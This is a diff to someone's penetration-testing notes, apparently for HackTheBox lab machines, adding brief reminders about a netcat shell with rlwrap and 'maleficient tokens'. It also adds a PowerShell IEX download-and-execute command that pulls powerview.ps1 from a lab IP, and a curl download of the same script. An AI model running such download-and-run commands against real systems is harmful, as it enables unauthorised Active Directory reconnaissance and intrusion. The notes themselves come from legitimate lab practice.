@@ -20,3 +20,16 @@ squashed - not done
 Granny - done
 
 Escape - todo
+
+rlwrap a better way to get nc shell
+
+maleficient tokens
+
+hackthebox enterprise
+
+powershell IEX(New-Object Net.Webclient).downloadstring('http://10.17.36.41:8000/powerview.ps1')
+
+curl http://10.10. -O powerview.ps1
+import powerview
+
+
